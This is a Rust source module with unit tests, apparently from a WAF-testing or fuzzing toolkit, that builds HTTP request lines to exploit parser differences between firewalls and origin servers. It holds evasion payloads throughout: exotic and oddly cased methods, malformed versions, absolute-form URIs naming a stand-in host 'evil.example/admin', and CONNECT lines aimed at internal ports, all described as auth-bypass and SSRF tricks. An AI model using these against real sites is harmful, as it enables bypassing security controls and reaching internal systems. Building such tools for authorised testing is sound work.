//! HTTP request-line differential encoders.
//!
//! Almost every byte of the request line — the first three tokens of
//! an HTTP/1.x request — has some WAF parser that misreads it. This
//! module produces request lines that one parser accepts as the
//! benign request the WAF expects, while a different parser further
//! down the chain reinterprets them.
//!
//! - **Method tricks.** Exotic methods (WebDAV: `PROPFIND`, `LOCK`,
//!   `MERGE`; CalDAV: `REPORT`; private: `PURGE`, `CONNECT`). Some
//!   WAFs hard-allow `GET`/`POST`/`PUT` only — others allow anything
//!   but apply *no* rules to "weird" methods.
//! - **Method case + whitespace.** `GeT /foo`, `GET\t/foo`, `GET
//!   /foo` (multiple spaces), `GET<TAB>/foo<TAB>HTTP/1.1`. RFC says
//!   ONE space; some parsers fold runs of whitespace.
//! - **Version tricks.** `HTTP/0.9` (response has no headers — some
//!   WAFs don't classify), `HTTP/1.99`, `HTTP/2.0` (mismatched
//!   version vs transport), no version at all (HTTP/0.9-style).
//! - **URI forms.** RFC 7230 §5.3 allows four request-target forms:
//!   `origin-form` (`/path`), `absolute-form` (`http://host/path`),
//!   `authority-form` (`host:port` — only for CONNECT), `asterisk-form`
//!   (`*` — only for OPTIONS). Most WAFs assume origin-form; passing
//!   absolute-form is a classic auth/path-bypass trick.

/// Generate every method variant that has a known parser-discrepancy
/// in some WAF, expressed as one possible first-token-of-request-line.
///
/// Useful as the seed set for a `--method` fuzzer or evolution loop.
#[must_use]
pub fn exotic_methods() -> Vec<&'static str> {
    vec![
        // WebDAV
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
        // CalDAV / CardDAV
        "REPORT", "ACL", "SEARCH",
        // Cache control (Varnish / Squid private)
        "PURGE", "BAN", "REFRESH",
        // Versioning extensions (RFC 3253)
        "VERSION-CONTROL", "MKWORKSPACE", "UPDATE", "CHECKIN", "CHECKOUT",
        "MKACTIVITY", "BASELINE-CONTROL", "MERGE",
        // Patch (RFC 5789) — older WAFs predate it
        "PATCH",
        // Tracing
        "TRACE",
        // Lowercase variants (some WAFs case-fold, some don't)
        "get", "post", "put", "delete",
        // Mixed case
        "GeT", "PoSt", "PuT", "DeLeTe",
        // Tab/space padded names (the leading whitespace gets stripped
        // by most servers but inspected literally by some WAFs)
        " GET", "\tGET", " GET ",
    ]
}

/// Produce request-line bytes where the URI is rendered in
/// absolute-form (RFC 7230 §5.3.2).
///
/// `host_in_uri` is the host the URI's authority component carries;
/// `path` is the path-and-query.
///
/// Example: `GET http://evil.example/admin HTTP/1.1\r\nHost: target\r\n`
/// Origin may route by URI; WAF may route by Host. Classic SSRF/
/// auth-bypass shape.
#[must_use]
pub fn absolute_uri_request_line(method: &str, host_in_uri: &str, path: &str) -> String {
    format!("{method} http://{host_in_uri}{path} HTTP/1.1")
}

/// Same as `absolute_uri_request_line` but with HTTPS scheme.
#[must_use]
pub fn absolute_uri_https_request_line(method: &str, host_in_uri: &str, path: &str) -> String {
    format!("{method} https://{host_in_uri}{path} HTTP/1.1")
}

/// Build a request line using a specific HTTP version string. Some
/// parsers honor `HTTP/0.9` (no headers, no status line on response).
/// Some accept `HTTP/2.0` as a version on the wire even when the
/// transport is HTTP/1.1.
#[must_use]
pub fn request_line_with_version(method: &str, path: &str, version: &str) -> String {
    format!("{method} {path} {version}")
}

/// Render a request line with non-standard whitespace between the
/// three tokens.
///
/// RFC 7230 allows exactly one SP. Real parsers accept a wide variety
/// of separator strings — TAB, multiple SP, mixed — and the WAF may
/// disagree with the origin on what counts as "the path".
#[must_use]
pub fn request_line_with_whitespace(
    method: &str,
    method_sep: &str,
    path: &str,
    path_sep: &str,
    version: &str,
) -> String {
    format!("{method}{method_sep}{path}{path_sep}{version}")
}

/// Asterisk-form request target. RFC 7230 §5.3.4 — only valid for
/// `OPTIONS *`. Some WAFs reject; some pass without rule application.
#[must_use]
pub fn asterisk_form_request_line(method: &str) -> String {
    format!("{method} * HTTP/1.1")
}

/// Authority-form request target (`host:port`). RFC 7230 §5.3.3 —
/// only valid for `CONNECT`. A WAF that sees `CONNECT internal:8080`
/// and the upstream proxy that accepts it can be tricked into
/// tunneling to private addresses.
#[must_use]
pub fn authority_form_request_line(method: &str, host: &str, port: u16) -> String {
    format!("{method} {host}:{port} HTTP/1.1")
}

/// Returns the list of every request-line trick exposed by this
/// module, used by the integration test as a registry to assert
/// none was forgotten.
pub const REQUEST_LINE_TRICKS: &[&str] = &[
    "exotic_methods",
    "absolute_uri_request_line",
    "absolute_uri_https_request_line",
    "request_line_with_version",
    "request_line_with_whitespace",
    "asterisk_form_request_line",
    "authority_form_request_line",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn exotic_methods_includes_propfind() {
        assert!(exotic_methods().contains(&"PROPFIND"));
    }

    #[test]
    fn exotic_methods_includes_purge() {
        assert!(exotic_methods().contains(&"PURGE"));
    }

    #[test]
    fn exotic_methods_includes_lowercase() {
        assert!(exotic_methods().contains(&"get"));
        assert!(exotic_methods().contains(&"post"));
    }

    #[test]
    fn exotic_methods_includes_mixed_case() {
        assert!(exotic_methods().contains(&"GeT"));
    }

    #[test]
    fn exotic_methods_includes_whitespace_pad() {
        assert!(exotic_methods().iter().any(|m| m.starts_with(' ')));
        assert!(exotic_methods().iter().any(|m| m.starts_with('\t')));
    }

    #[test]
    fn exotic_methods_minimum_count() {
        // Adding more is fine; removing a known parser-discrepancy
        // method is not — every entry here has been observed to flip
        // SOME WAF's rule set off.
        assert!(
            exotic_methods().len() >= 25,
            "regression: lost coverage of exotic-method set"
        );
    }

    #[test]
    fn absolute_uri_basic() {
        let rl = absolute_uri_request_line("GET", "evil.example", "/admin");
        assert_eq!(rl, "GET http://evil.example/admin HTTP/1.1");
    }

    #[test]
    fn absolute_uri_https() {
        let rl = absolute_uri_https_request_line("POST", "evil.example", "/api");
        assert_eq!(rl, "POST https://evil.example/api HTTP/1.1");
    }

    #[test]
    fn absolute_uri_preserves_query() {
        let rl = absolute_uri_request_line("GET", "h", "/a?b=c&d=e");
        assert!(rl.contains("?b=c&d=e"));
    }

    #[test]
    fn version_explicit_http_0_9() {
        let rl = request_line_with_version("GET", "/", "HTTP/0.9");
        assert_eq!(rl, "GET / HTTP/0.9");
    }

    #[test]
    fn version_explicit_http_1_99() {
        let rl = request_line_with_version("GET", "/", "HTTP/1.99");
        assert_eq!(rl, "GET / HTTP/1.99");
    }

    #[test]
    fn version_explicit_http_2_on_h1_wire() {
        let rl = request_line_with_version("GET", "/", "HTTP/2.0");
        assert_eq!(rl, "GET / HTTP/2.0");
    }

    #[test]
    fn whitespace_tab_between_tokens() {
        let rl = request_line_with_whitespace("GET", "\t", "/", "\t", "HTTP/1.1");
        assert_eq!(rl, "GET\t/\tHTTP/1.1");
        assert!(!rl.contains(' '), "no SP, only TAB");
    }

    #[test]
    fn whitespace_multiple_spaces() {
        let rl = request_line_with_whitespace("GET", "   ", "/", "   ", "HTTP/1.1");
        assert_eq!(rl, "GET   /   HTTP/1.1");
    }

    #[test]
    fn whitespace_mixed() {
        let rl = request_line_with_whitespace("GET", " \t ", "/", "\t \t", "HTTP/1.1");
        assert!(rl.contains('\t'));
        assert!(rl.contains(' '));
    }

    #[test]
    fn asterisk_form_options() {
        let rl = asterisk_form_request_line("OPTIONS");
        assert_eq!(rl, "OPTIONS * HTTP/1.1");
    }

    #[test]
    fn asterisk_form_invalid_method_still_produces_string() {
        // Asterisk form is only valid for OPTIONS per RFC, but we
        // produce the wire bytes regardless so callers can test
        // server tolerance.
        let rl = asterisk_form_request_line("GET");
        assert_eq!(rl, "GET * HTTP/1.1");
    }

    #[test]
    fn authority_form_connect() {
        let rl = authority_form_request_line("CONNECT", "internal", 8080);
        assert_eq!(rl, "CONNECT internal:8080 HTTP/1.1");
    }

    #[test]
    fn authority_form_high_port() {
        let rl = authority_form_request_line("CONNECT", "h", u16::MAX);
        assert!(rl.ends_with("65535 HTTP/1.1"));
    }

    #[test]
    fn registry_lists_every_function_we_expose() {
        // Smoke that REQUEST_LINE_TRICKS hasn't drifted from the
        // public API.
        assert_eq!(REQUEST_LINE_TRICKS.len(), 7);
    }

    #[test]
    fn no_function_produces_crlf_in_output() {
        // Every output of this module is meant to be ONE line of a
        // request — embedding CRLF would let a caller smuggle a
        // second request line, which is a different attack class
        // (smuggling crate). Keep the boundary clean.
        let candidates = vec![
            absolute_uri_request_line("GET", "h", "/p"),
            absolute_uri_https_request_line("GET", "h", "/p"),
            request_line_with_version("GET", "/", "HTTP/0.9"),
            request_line_with_whitespace("GET", " ", "/", " ", "HTTP/1.1"),
            asterisk_form_request_line("OPTIONS"),
            authority_form_request_line("CONNECT", "h", 443),
        ];
        for c in candidates {
            assert!(!c.contains("\r\n"), "no CRLF in request line: {c:?}");
            assert!(!c.contains('\n'),  "no LF in request line: {c:?}");
        }
    }

    #[test]
    fn deterministic_across_calls() {
        let a = exotic_methods();
        let b = exotic_methods();
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_path_no_panic() {
        let big = "/a".repeat(10_000);
        let _ = absolute_uri_request_line("GET", "h", &big);
        let _ = request_line_with_version("GET", &big, "HTTP/1.1");
    }
}
